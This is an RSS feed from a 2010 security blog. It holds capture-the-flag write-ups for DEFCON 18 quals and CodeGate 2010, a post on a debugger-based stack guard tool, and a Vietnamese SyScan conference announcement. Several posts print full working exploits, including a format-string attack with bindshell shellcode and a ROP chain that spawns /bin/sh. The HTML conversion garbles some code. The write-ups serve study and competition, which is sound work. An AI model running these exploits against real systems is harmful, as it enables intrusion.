<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: 2010</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Stack Guard &amp; Format String Blocker in Python</title>
  <link>http://realjenius.com/research/2010/12/23/stack-guard-format-string-blocker-in-python.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-12-23T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2010/12/23/stack-guard-format-string-blocker-in-python.html</guid>
  <description><![CDATA[
     <p>[Download the tool][1]</p>

<p>`<br />
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%<br />
Stack Guard &amp; Format String Blocker in Python<br />
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%&lt;/p&gt;</p>
<p>  :author:     Nam T. Nguyen<br />
  :copyright:  2010, public domain</p>
<p>(Shamefully admitted that this tool was used in the Capture the Flag game at HITB Kuala Lumpur 2010, and it failed)</p>
<p>The Big Picture<br />
===============</p>
<p>Basically, we are running the application under a debugger. When an interesting event occurs, we process it accordingly.</p>
<p>Stack Guard<br />
-----------</p>
<p>The interesting events are function entry and function exit. When we enter into a function, the value at top of stack is XOR'd with a random value. When we exit from a function, the value at TOS is again XOR'd with that same random value.</p>
<p>Format String<br />
-------------</p>
<p>The interesting events are those ``printf`` family functions. When the function is entered, we just have to check if its format string argument contains ``%n`` or ``%hn``. For some functions (e.g. ``printf```), this argument is at TOS + 4 (leave one for saved EBP), for some others (e.g. ``fprintf``) it is at TOS + 8, yet for some (e.g. ``snprintf``) it is at TOS + 12.</p>
<p>The Problems<br />
============</p>
<p>Breakpoints<br />
-----------</p>
<p>The main issue is with multi-process (fork'd code) applications. Basically, when they fork, the soft-breakpoints (0xCC) are retained but the handler does not attach to the new process. Therefore, when a breakpoint hits, the newly forked process simply dies.</p>
<p>To work around this issue, the ``MultiprocessDebugger`` class is written to remember breakpoints in both original and forked processes. It also kills new image (via ``exec``) to protect against successful exploitation that launches ``/bin/sh``, for example.</p>
<p>Function entries/exits<br />
----------------------</p>
<p>Basically, to find all function entries, and exits, we have to walk the code. A recursive iterator (flattened with a simple queue) is used to visit all functions from a starting location (usually ``main`` function). When a ``CALL`` instruction is reached, its destination is deemed a function entry. When a ``RET`` instruction is reached, this current location is deemed an exit of the the current function. This does not work with indirect calls (``CALL EAX``, for e.g.) because we do not know its destination.</p>
<p>Samples<br />
=======</p>
<p>Please peruse ``target.py`` for a sample usage.<br />
`

 [1]: http://force.vnsecurity.net/download/lamer/guard.zip
</p>

  ]]></description>
</item>

	<item>
  <title>DEFCON 18 Quals: Pwtent Pwnables 500 write up</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-write-up.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-05-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-write-up.html</guid>
  <description><![CDATA[
     <p>This is a short write up since I’m a bit lazy. We didn’t solved it during the quals as it was too late (we exhausted and most of member including myself went to sleep so I only started looking into this in the morning of Monday. Didn’t have enough of time to finish it).</p>

<p>For pp500, ddtek gave us a pcap network dump of a remote exploit to a daemon on host 192.41.96.63, port 6913 and password to login is ‘antagonist’. Playing around with the daemon, I found out that ‘b’ command returns you back a block of 512 bytes from the binary.</p>

<pre>Password: antagonist
? to see the menu
&gt; ?
x - quit
d - donate entropy
r - report
b - /dev/hrnd
? - help
&gt; b
Seed: 0
ELF     4�$4 (444�������&amp;&amp; l � ��/libexec/ld-elf.so.FreeBSDk5%20   .1!
                                                                      "
/)(-*&gt;</pre>

<p>Seed value from 0 to 19 returned the same data, 20 returned different data, 21-39 same as 20, … So I wrote a script to extract out all the blocks from the binary with seed values 0, 20, 40, 60, 80, ….. After filtered out all the duplicated blocks, there were totally 21 unique blocks.</p>

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python
import sys
import socket

class humpty:
        def  __init__(self, host, port):
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((host, port))
                ret = self.s.recv(1024)
                print ret

        def login(self, passwd):
                self.s.send(passwd + "n")
                ret = self.s.recv(1024)
                print ret

        def getdata(self, seed):
                print seed
                cmd = "bn"
                self.s.send(cmd)
                ret = self.s.recv(1024)
                print ret
                ret = self.s.recv(1024)
                print ret

                self.s.send("%dn" % seed)
                ret = ret + self.s.recv(1024)
                ret = ret
                #print len(ret), repr(ret)
                return ret[6:518]

        def close(self):
                self.s.close()

def log(file, data):
        f = open(file, "w")
        f.write(data)
        f.close()

host = '192.41.96.63'
port = 6913

c = humpty(host, port)
a = raw_input("Enter to continue");
c.login("antagonist")

data = []
for i in range(0, 100):
        data.append(c.getdata(20*i));

data = list(set(data))
print "Total %d unique blocks" % len(data)
for i in range(0, len(data)):
        log("%d"%i, data[i])

print "Done"
c.close()
</pre>

<p>From the pcap dump session, we can find out that the size of humpty binary is 10392, which is 21 blocks of 512 bytes</p>

<pre>-rwxr-x---  1 root  humpty  10392 May 22 19:06 humpty
-rw-r-----  1 root  humpty     21 May 22 19:01 key</pre>

<p>The task now is to merge all the blocks in a the right order to rebuild the ELF binary. What I did was to get a sample freebsd binary which has similar size as humpty, then used `split -b512` to split it to 21 chunks of 512 bytes and then compared side by side with the 21 extracted blocks from ddtek’s pp500 server, merged it manually and used readelf to verify the merged binary. <a href="http://force.vnsecurity.net/download/humpty">Here</a> (or <a href="http://ddtek.biz/pp500">here</a>) is the binary for pp500′s humpty.</p>

<p>After getting the binary, the rest of the tasks are easy since ddtek gave us out the exploit from the pcap dump. The exploit is similar to <a href="/2010/05/defcon-18-quals-pwtent-pwnables-500-exploit/">the exploit of esd2</a>. FYI, esd2 is the original binary for pp500 which was leaked out via pp200 shell. After ddtek guys realized of this problem, they modified the esd2, changed password, strings, commands, read elf block functions, xor input, .. and named it humpty.</p>


  ]]></description>
</item>

	<item>
  <title>DEFCON 18 Quals: Pwtent Pwnables 500 esd2 exploit</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-exploit.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-05-28T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/05/28/defcon-18-quals-pwtent-pwnables-500-exploit.html</guid>
  <description><![CDATA[
     <p>CLGT did not solved this during the quals! Here is the exploit for  the **esd2 **<a href="http://beist.org/esd2">leaked</a> from pp200 (thanks beist for sharing). More analysis &amp; write up for the real pp500 will come later:</p>

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python

import socket
import struct
import telnetlib
import time

HOST = '192.168.56.101'
PORT = 8302

def xor_input(data):
    static = "%5d | %5dn" + "x00"*4
    out = ""
    for i in range(len(data)):
        out += chr(ord(static[i]) ^ ord(data[i]))
    return out

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# send password
s.send("sp3wn0w" + "n")

# prepare the payload
# overwrite lseek@plt, original value = 0x08048ae2
target = 0x804a30c
# shellcode address = 0x0804a040 + 142 bytes (padding + fmt_string)
ret = 0x0804a0ce
# value to write into target
write_byte = 0xa0ce
# payload = target + padding(128 - 4) + 14 (fmt_string) + shellcode
padding = "A"*128
fmt_string = "%" + str(write_byte) + "u%24$hn"
fmt_string = xor_input(fmt_string)

# bindshell: port 5678
shellcode = "x00x29xc9x83xe9xecxd9xeexd9x74x24xf4x5bx81x73x13x63x7dxa9x09x83xebxfcxe2xf4x09x1cxf1x90x31x15xb9x0bx75x53x20xe8x31x3fxfbx4bx31x17xb9xc4xe3xe4x3ax58x30x2fxc3x61x3bxb0x29xb9x09xb0x29x5bx30x2fx19x17xaexfdx3ex63x61x24xc3x53x3bx2cxfex58xaexfdxe0x70x96x2dxc1x26x4cx0exc1x61x4cx1fxc0x67xeax9exf9x5dx30x2ex19x32xaexfdxa9x09"

payload = struct.pack("&lt;L", target) + padding[4:] + fmt_string + shellcode + "n"

print "Sending payload...", repr(payload)
s.send("cn" + str(len(payload)) +"n")
s.send(payload)
# trigger the read_blob that calls lseek()
s.send("rn" + "10n")

print "Connecting to remote shell port 5678..."
time.sleep(4)
t = telnetlib.Telnet(HOST, 5678)
t.write("idnn")
t.interact()

t.close()
s.close()
</pre>


  ]]></description>
</item>

	<item>
  <title>Hội thảo bảo mật quốc tế SyScan 2010 đến Tp.HCM</title>
  <link>http://realjenius.com/headlines/2010/05/27/hoi-thao-bao-mat-quoc-te-syscan-2010-den-tp-hcm.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-05-27T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/headlines/2010/05/27/hoi-thao-bao-mat-quoc-te-syscan-2010-den-tp-hcm.html</guid>
  <description><![CDATA[
     <p><a href="http://www.syscan.org/" target="_blank">SyScan</a> (Symposium on Security for Asia Network) là một trong các hội thảo bảo mật chuyên đề uy tín ở châu Á. Khác với các hội thảo bảo mật khác, SyScan không nói về sản phẩm hay giải pháp thương mại, mà là nơi các chuyên gia bảo mật hàng đầu trên thế giới đến để chia sẻ các nghiên cứu, phát hiện và kinh nghiệm của họ với giới bảo mật trong khu vực. Các diễn giả ở SyScan là những chuyên gia thuộc nhóm giỏi nhất, nổi bật nhất trong lĩnh vực họ nghiên cứu, sẽ đến và chia sẻ trong một hội thảo diễn ra trong hai ngày.</p>

<div style="width: 460px" class="wp-caption aligncenter">
  <a href="http://www.syscan.org/hcm/registration.php" target="_blank"><img class=" " title="Tham gia Syscan HCM để có cơ hội trúng thưởng máy tính bảng Apple iPad" src="/wp/storage/uploads/2010/05/announce_ipad.jpg" alt="Tham dự Syscan HCM để có cơ hội trúng thưởng máy tính bảng Apple iPad" width="450" /></a><p class="wp-caption-text">
    Tham dự Syscan 2010 HCM để có cơ hội trúng thưởng máy tính bảng Apple iPad
  </p>
</div>

<p>Đây là lần đầu tiên hội thảo SyScan được tổ chức ở Việt Nam với sự phối hợp đồng tổ chức giữa Syscan, công ty IET và nhóm <a href="http://www.vnsecurity.net/" target="_self">VNSECURITY</a> – nhóm nghiên cứu bảo mật hàng đầu hiện nay ở VN và cũng là nhà tổ chức hội thảo bảo mật quốc tế <a href="http://conf.vnsecurity.net" target="_blank">VNSECON</a> năm 2007. Hội thảo <a href="http://www.syscan.org/hcm/index.php">SyScan 2010 HCM</a> sẽ diễn ra từ ngày 23 đến 24 tháng 9 năm 2010 tại khách sạn Sheraton, 88 Đồng Khởi – Q.1 – Tp.HCM. Trọng tâm của hội thảo năm nay sẽ nhắm vào các chủ đề bảo mật nóng bỏng hiện nay trên thế giới như: Bảo mật hệ điều hành, Ảo hoá và Điện toán đám mây, Bảo mật trình duyệt, Bảo mật thiết bị di động, hệ thống nhúng, Web 2.0, Mạng viễn thông, Mạng máy tính, Chính sách an ninh, Chiến tranh điện tử, … Các đề tài này sẽ được xét duyệt bởi một hội đồng kỹ thuật gồm các chuyên gia bảo mật hàng đầu:</p>

<ul type="DISC">
  <li>
    Thomas Lim &#8211; Sáng lập SyScan, CEO công ty bảo mật COSEINC
  </li>
  <li>
    Dave Aitel &#8211; Sáng lập viên và là CEO của công ty bảo mật ImmunitySec
  </li>
  <li>
    Marc Maiffret &#8211; Đồng sáng lập và là Chief Hacking Officer của công ty bảo mật eEye
  </li>
  <li>
    Matthew &#8220;Shok&#8221; Conover &#8211; Công ty bảo mật Symantec
  </li>
  <li>
    Thanh Nguyen &#8211; Security Center of Excellence, Intel / Sáng lập viên VNSECURITY
  </li>
</ul>

<p>Các báo cáo sẽ được các diễn giả trình bày bằng tiếng Anh. Tuy nhiên các tài liệu và bản thuyết trình sẽ được chiếu song ngữ tiếng Anh và tiếng Việt. Song song với buổi hội thảo, sẽ diễn ra các khoá huấn luyện ngắn hạn do các chuyên gia tên tuổi đứng lớp với các chủ đề khá chuyên biệt như Khai thác lỗi hổng bảo mật trên Windows, Bảo mật ứng dụng Web, Xây dựng mạng Wifi an toàn, …</p>

<blockquote>
  <p style="padding-left: 30px">
  <strong>Mời tham gia gửi báo cáo</strong><br /> Ban tổ chức mong sẽ nhận được các báo cáo từ các chuyên gia an ninh mạng và bảo mật trong nước để trình bày tại hội thảo Syscan 2010 HCM. Chi tiết về CFP xin xem tại <a href="http://www.syscan.org/hcm/callforpapers.php" target="_blank">http://www.syscan.org/hcm/callforpapers.php </a>
</p>
</blockquote>

<p>Do tổ chức ở VN, ban tổ chức đã cân nhắc mức chi phí phù hợp cho đa số các đối tượng quan tâm đến bảo mật có thể tham gia. BTC hiện đang cho <a href="http://www.syscan.org/hcm/registration.php" target="_blank">đăng ký tham dự sớm</a> với chi phí tham dự hội thảo chỉ là 50 USD (20 USD đối với sinh viên) / người từ nay đến hết tháng 5. Chi phí đăng ký tham dự trong tháng 6 sẽ là 100 USD / người và đến ngày hội thảo là 300 USD / người. Đây là giá rất rẻ cho hội thảo quốc tế về an ninh mạng và bảo mật có quy mô và chất lượng cao (giá trung bình ở các hội thảo khác trong đó có <a href="http://www.syscan.org/Sg/registration.html">Syscan 2010 Singapore</a> là khoảng 500-1500 USD/người). Ngoài ra, mỗi người tham dự sẽ có cơ hội bốc thăm trúng thưởng máy tính bảng iPad của hãng Apple. Để đăng ký, bạn hãy gửi thông tin cho ban tổ chức qua trang web sau <a href="http://www.syscan.org/hcm/registration.php" target="_blank">http://www.syscan.org/hcm/registration.php</a>. Đại diện BTC ở VN sẽ liên hệ bạn để xác nhận và thống nhất về phương thức thanh toán. Nếu bạn có thắc mắc hay câu hỏi, xin vui lòng liên hệ qua địa chỉ email <strong>conf @ vnsecurity chấm net</strong>.</p>

<blockquote>
  <p style="padding-left: 30px">
  <strong>Vietnam Hacking Festival</strong>
</p>

  <p style="padding-left: 30px">
  Song song với khuôn khổ hội thảo quốc tế SyScan 2010 diễn ra trong hai ngày 23 &#8211; 24-9-2010, nhóm VNSECURITY cũng sẽ tổ chức vòng chung kết &#8220;Vietnam Hacking Festival&#8221;, một cuộc thi CTF với sự tham gia của các đội trong và ngoài nước. Vòng loại của cuộc thi sẽ diễn ra vào đầu tháng 8-2010. Thông tin cụ thể sẽ được thông báo trên trang chủ VNSecurity.net.
</p>
</blockquote>


  ]]></description>
</item>

	<item>
  <title>Return-oriented-programming practice: exploiting CodeGate 2010 Challenge 5</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-04-18T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</guid>
  <description><![CDATA[
     <p>In my <a href="http://www.vnsecurity.net/2010/03/codegate-2010-online-ctf-challenge-4-5-writeup/" target="_blank">previous post</a> about CodeGate 2010 Challenge 5 exploit, I mentioned the weakness of accessing server to get <em>execl()</em> address. In this post I will show how to blindly exploit the “harder” program without access to the remote server using <a href="http://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">return-oriented-programming</a> technique.</p>

<h2 id="rop-introduction">ROP introduction</h2>

<p>A worth to read post about ROP introduction can be found on Zynamics blog: <a href="http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/" target="_blank">http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/</a></p>

<p>In summary: we will use return-into-instructions (called gadgets) to build and execute our payload when controlled EIP and ESP from vulnerable program.</p>

<p>ROP limitations (difficulties):</p>

<ul>
  <li>ASLR: the same as return-into-libc, it’s difficult to locate address of instructions in library (e.g libc)</li>
  <li>ASCII-armor address: with ascii-armor remapping of libraries (e.g libc), addresses will contain NULL byte so chaining return-into-libc calls and ROP is impossible if there’s NULL filter in input</li>
</ul>

<h2 id="the-8220harder8221-case">The “harder” case</h2>

<p>Fortunately, we can blindly exploit the “harder” program using ROP because it provides some “advantages” in code:</p>

<ul>
  <li><em>getline()</em>: can pass NULL byte to input</li>
  <li><em>printf()</em>: can leak runtime memory info (bypass ASLR)</li>
</ul>

<h2 id="finding-rop-gadgets">Finding ROP gadgets</h2>

<p>Our target is to invoke <strong>execve(“/bin/sh”, 0, 0)</strong> syscall, which is equivalent to prepare registers’ value then trigger kernel syscall:</p>

<blockquote>
  <p>eax = 0xb // execve<br />
ebx = address of “/bin/sh”<br />
ecx = 0 // argv<br />
edx = 0 // env</p>
</blockquote>

<p>Searching in harder binary, we found below gadgets:</p>

<ul>
  <li>eax: 
    <pre>80483a4:    58                       pop    %eax
80483a5:    5b                       pop    %ebx
80483a6:    c9                       leave
80483a7:    c3                       ret</pre>
  </li>
  <li>ebx &amp; ecx: 
    <pre>8048634:    59                       pop    %ecx
8048635:    5b                       pop    %ebx
8048636:    c9                       leave
8048637:    c3                       ret</pre>

    <p>“/bin/sh” is placed on target buffer, its address is available by leaking via <em>printf()</em>&lt;/li&gt; &lt;/ul&gt; 
*   edx:<br />
    There’s no edx related gadget but observing that when returned from <em>memcpy()</em> edx’s value is set to esi so we can assign esi to 0×0 first then return again to main to nullify edx.&lt;/p&gt; 
    &lt;pre&gt;0x001ba506 :    mov    edx,esi
80485e6:    5e                       pop    %esi
80485e7:    5f                       pop    %edi
80485e8:    5d                       pop    %ebp
80485e9:    c3                       ret&lt;/pre&gt;</p>

    <ul>
      <li>
        <p>syscall:<br />
In recent Linux kernel, syscall is usually performed via linux gate: <strong>call gs:[0x10]</strong>. By return to back to <em>printf()</em> in harder program many times, we can find the offset from <em>getline()</em> to first syscall is 319 bytes.</p>
      </li>
      <li>
        <p>moving stack:<br />
After <strong>“leave; ret”</strong> our stack will be moved to new location pointing by ebp. We can control this by set ebp back to somewhere in the middle of target buffer.</p>
      </li>
    </ul>

    <h2 id="exploit-code">Exploit code</h2>

    <pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python

</pre>
  </li>
</ul>
<p>import socket
import sys
import struct
import telnetlib</p>

<h1 id="host--ctf4codegateorg">host = ‘ctf4.codegate.org’</h1>
<p>host = ‘127.0.0.1’
port = 9005</p>

<p>c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((host, port))</p>

<p>buf=””
# bypass first read
buf = c.recv(1024)</p>

<h1 id="getline-address">getline() address</h1>
<p>buf = “A”*268 + struct.pack(‘i’, 0x08048524) + struct.pack(‘i’, 0x0804a008) + “n”
c.send(buf)
buf = c.recv(1024)
addr = “”
getline_addr = int(buf[:4][::-1].encode(‘hex’), 16)
print “getline() is at:”, hex(getline_addr)</p>

<h1 id="call-gs0x10-address">call gs:[0x10] address</h1>
<p>offset = 319 # first offset is 319 bytes from getline()
syscall_addr = getline_addr + offset</p>

<h1 id="buffer-address">buffer address</h1>
<p>buf = “%7$x” + “x00”<em>260 + struct.pack(‘i’, 0x08048521)</em>2 + “n”
c.send(buf)
buf = c.recv(1024)
input_addr = int(buf[:8], 16)
print “Buffer address is at: “, hex(input_addr)</p>

<h1 id="gadgets-address">gadgets address</h1>
<p>pop_eax = 0x080483a4
pop_ecx_ebx = 0x08048634
pop_esi = 0x080485e6</p>

<h1 id="pop-esi">pop esi</h1>
<p>buf = “A”<em>268 + struct.pack(‘i’, pop_esi) + “x00” * 12 + struct.pack(‘i’, 0x08048524)</em>2  + “n”
c.send(buf)
c.recv(1024)</p>

<h1 id="pop-eax-then-move-stack-to-new-address">pop eax then move stack to new address</h1>
<p>input_addr += 560 # lifting after 2 getline() calls
new_stack = input_addr+8
buf = “/bin/shx00” # /bin/sh
buf += struct.pack(‘i’, new_stack+16) # next ebp after leave from pop_eax
buf += struct.pack(‘i’, pop_ecx_ebx) # next is pop_ecx_ebx
buf += “x00”<em>4 # ecx
buf += struct.pack(‘i’, input_addr) # ebx -&gt; /bin/sh
buf += “A”</em>4 # un-used ebp after leave from pop_ecx_ebx
buf += struct.pack(‘i’, syscall_addr)
buf = buf.ljust(264, “A”) # padding
buf += struct.pack(‘i’, new_stack) # new ebp
buf += struct.pack(‘i’, pop_eax)
buf += “x0bx00x00x00” # execve syscal
buf += “A”*4 # un-used ebx
buf += “n”</p>

<p>print “Sending final payload …”
c.send(buf)
c.send(“id 2&gt;&amp;1” + “n”*5)</p>

<p>t = telnetlib.Telnet()
t.sock = c
t.interact()
c.close()</p>

<p>&lt;/pre&gt;</p>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2010 &#8211; Challenge 7: Weak SSL Cracking</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge7-weak-ssl-cracking.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-23T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge7-weak-ssl-cracking.html</guid>
  <description><![CDATA[
     <p>Writeup for CodeGate 2010 – Challenge 7 by <a href="http://namnham.blogspot.com/" target="_blank">namnx</a></p>

<hr />

<div style="text-align: justify">
  Last weekend, I had a great hacking time with team <a href="http://www.vnsecurity.net/about-us/clgt-ctf-team/">CLGT</a> in the <a href="http://ctf.codegate.org/">CodeGate 2010 CTF</a> Preliminary Round. It lasted 36 consecutive hours from 7:00AM March 13 to 7:00PM March 14. There were a lot of teams around the world participating in this hacking contest. And excellently, CLGT proved it as one of the best teams when got the 2nd place in this round. See <a href="http://beist.org/CG2010_rank.png">final ranking</a>.
</div>

<div style="text-align: justify">
  This entry is my writeup for challenge 7. I think this is an interesting challenge from which you can learn more deeply about SSL protocol and public key cryptography. In this challenge, we were provided a tcpdump file of a SSL traffic and a hint &#8220;<em>does the modulus look familiar?</em>&#8220;. So our goal is to analyze and decrypt this captured traffic to get the flag.
</div>

<p><strong><span style="font-family: Georgia,'Times New Roman',serif">Analysis</span></strong><br />
Firstly, I used Wireshark to load this file and start to analyze it:</p>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh3.ggpht.com/_BaefoYBtOwQ/S59Mv6OohsI/AAAAAAAAAW4/z7INUja_DtE/challenge7-1.png"><img src="http://lh3.ggpht.com/_BaefoYBtOwQ/S59Mv6OohsI/AAAAAAAAAW4/z7INUja_DtE/challenge7-1.png" border="0" alt="" width="500" height="271" /></a>
</div>

<div style="text-align: justify">
  There are 26 packets captured. Packet #4 is a <strong><em>SSL Client Hello</em></strong> packet, but after it, packet #8 and packet #9 have FIN flag. This mean that the session was termininated. So we just ignore them.
</div>

<div style="text-align: justify">
  Packet #14 is another <strong><em>SSL Client Hello</em></strong> packet. This is where the real session began. Take a look into it:
</div>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh4.ggpht.com/_BaefoYBtOwQ/S59PftmaEmI/AAAAAAAAAXA/yxCqiOSmyHA/challenge7-2.png"><img src="http://lh4.ggpht.com/_BaefoYBtOwQ/S59PftmaEmI/AAAAAAAAAXA/yxCqiOSmyHA/challenge7-2.png" border="0" alt="" width="500" height="274" /></a>
</div>

<div style="text-align: justify">
  There is nothing special. It is just a normal <strong><em>SSL Client Hello</em></strong> packet. It happens when a client want to connect to a SSL service. We continue look into the packet #16, the <strong><em>SSL Server Hello</em></strong> packet:
</div>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh6.ggpht.com/_BaefoYBtOwQ/S59SI8VjnhI/AAAAAAAAAXI/LGU0BQZP4x0/s1600/challenge7-3.png"><img src="http://lh6.ggpht.com/_BaefoYBtOwQ/S59SI8VjnhI/AAAAAAAAAXI/LGU0BQZP4x0/s400/challenge7-3.png" border="0" alt="" width="501" height="324" /></a>
</div>

<div style="clear: both;text-align: left">
  This is the response for SSL Client Hello packet. We can see some useful information here:
</div>

<div style="clear: both;text-align: left">
  - The cipher suite will be used: <strong>RSA_WITH_AES_256_CBC_SHA</strong>
</div>

<div style="clear: both;text-align: left">
  - The X509 certificate of the server
</div>

<div style="clear: both;text-align: justify">
  In the SSL protocol, the server send its certificate to the client in the handshaking process. This certificate will be used for supporting the key exchange afterward. The certificate contains the server&#8217;s public key and other data. By extracting the public key and recovering the private key from it, we can decrypt the SSL traffic.
</div>

<div style="clear: both;text-align: justify">
  <strong><span style="font-family: Georgia,'Times New Roman',serif">Exploit</span></strong>
</div>

<div style="clear: both;text-align: justify">
  I wrote some Python code to exploit this challange:
</div>

<pre class="brush: python; title: ; notranslate" title="">from scapy.all import *
    from M2Crypto import X509

    def decode_serverhello(packet):
    payload = packet.load
    cert = payload[94:1141]
    cert = X509.load_cert_string(cert, 0)
    return cert

    def get_pubkey(cert):
    pubkey = cert.get_pubkey().get_rsa()
    n = long(pubkey.n.encode('hex')[8:], 16)
    e = long(pubkey.e.encode('hex')[9:], 16)
    return n, e

    packets = rdpcap('ssl.pcap')
    cert = decode_serverhello(packets[15])
    n,e = get_pubkey(cert)
</pre>

<p>Because this traffic used RSA as public key algorithm, the public key contains 2 components: <strong>n</strong> and <strong>e</strong>. We get their values from the above code:</p>

<pre class="brush: python; title: ; notranslate" title="">n = 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
    e = 65537
</pre>

<div style="text-align: justify">
  In RSA, <strong>n</strong> is the product of 2 big prime numbers <strong>p</strong> and <strong>q</strong>. So, in order to recover the RSA private key from the public key, we must factorize <strong>n</strong> into <strong>p</strong> and <strong>q</strong>. This is the key point of the challenge. In this situation, n is a very big number (232 decimal digits). How can we do that? In the beginning, I didn&#8217;t know how to solve it. But I remembered the hint &#8220;<em>does the modulus look familiar?</em>&#8220;. So I tried <a href="http://bit.ly/azg7Vh">googling it</a> <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_biggrin.gif" alt=":-D" class="wp-smiley" /> (actually just its last digits). And&#8230; oh my god, I was lucky! It is <a href="http://en.wikipedia.org/wiki/RSA_numbers#RSA-768">RSA-768</a>. It&#8217;s factorized just few months ago.
</div>

<pre class="brush: python; title: ; notranslate" title="">RSA-768 = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
    × 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
</pre>

<p>So now, we have all components of the RSA keys.</p>

<pre class="brush: python; title: ; notranslate" title="">n = 1230186684530117755130494958384962720772853569595334792197322452151726400507263657518745202199786469389956474942774063845925192557326303453731548268507917026122142913461670429214311602221240479274737794080665351419597459856902143413
    e = 65537
    p = 33478071698956898786044169848212690817704794983713768568912431388982883793878002287614711652531743087737814467999489
    q = 36746043666799590428244633799627952632279158164343087642676032283815739666511279233373417143396810270092798736308917
    d = 703813872109751212728960868893055483396831478279095442779477323396386489876250832944220079595968592852532432488202250497425262918616760886811596907743384527001944888359578241816763079495533278518938372814827410628647251148091159553
</pre>

<div style="text-align: justify">
  The last thing we have to do is generating the RSA private key in PEM format from these components. But how can we do that? As far as I know, popular cryptographic libraries like OpenSSL do not support this. So in this case, I wrote my own tool to do this task. It is based on ASN1. It is a little long to post here. But if you want to write your own one, I recommend <a href="http://pyasn1.sourceforge.net/">pyasn1</a>.
</div>

<p>After having the private key, just import it to Wireshark to decrypt the SSL traffic:</p>

<div style="clear: both;text-align: center">
  <a style="margin-left: 1em;margin-right: 1em" href="http://lh6.ggpht.com/_BaefoYBtOwQ/S59zDsyIwPI/AAAAAAAAAXQ/dMd2XsmITRo/s1600/challenge7-4.png"><img src="http://lh6.ggpht.com/_BaefoYBtOwQ/S59zDsyIwPI/AAAAAAAAAXQ/dMd2XsmITRo/s400/challenge7-4.png" border="0" alt="" width="501" height="178" /></a>
</div>

<p><strong>References</strong><br />
- SSL/TLS: http://en.wikipedia.org/wiki/Transport_Layer_Security<br />
- RSA: http://en.wikipedia.org/wiki/RSA</p>

  ]]></description>
</item>

	<item>
  <title>CodeGate 2010 &#8211; Challenge 8: Bit-flipping attack on CBC mode</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge-8-bit-flipping-attack-on-cbc-mode.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-03-23T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge-8-bit-flipping-attack-on-cbc-mode.html</guid>
  <description><![CDATA[
     <p>Writeup for CodeGate 2010 Challenge 8 by <a href="http://namnham.blogspot.com/" target="_blank">namnx</a></p>

<hr />

<p>This is a web-based cryptography challenge. In this challenge, we were provided a URL and a hint “<em>the first part is just an IV</em>“.</p>

<p>The URL is: <a href="http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php">http://ctf1.codegate.org/99b5f49189e5a688492f13b418474e7e/web4.php</a>.</p>

<h3 id="analysis">Analysis</h3>

<p>Go to the challenge URL. It will ask you the username for the first time. After we enter a value, for example ‘<span style="font-family: 'Courier New',Courier,monospace">namnx</span>‘, it will return only a single message “<span style="font-family: 'Courier New',Courier,monospace">Hello, namnx!</span>“. Examine the HTTP payload, we will see the cookie returned:</p>

<blockquote>
  <table>
    <tbody>
      <tr>
        <td>web4_auth=1vf2EJ15hKzkIxqB27w0AA==</td>
